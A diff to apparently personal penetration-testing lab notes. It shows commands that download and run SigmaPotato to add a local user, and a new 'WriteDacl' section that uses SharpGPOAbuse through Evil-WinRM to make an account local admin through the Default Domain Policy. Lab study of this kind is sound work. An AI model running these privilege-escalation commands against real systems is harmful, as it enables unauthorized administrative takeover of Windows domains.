@@ -653,3 +653,20 @@ iwr -uri http://192.168.45.227/SigmaPotato.exe -OutFile SigmaPotato.exe
 .\SigmaPotato "net user dave4 lab /add"
 ```
 ![alt text](image-14.png)
+
+# WriteDacl
+
+![alt text](image-15.png)
+
+```bash
+# Upload to Evil-WinRM Session
+upload SharpGPOAbuse.exe
+
+# Run it
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"
+
+# Force Update group policy
+gpupdate /force
+
+# Reload Evil-WinRM Session with elevated privs
+```
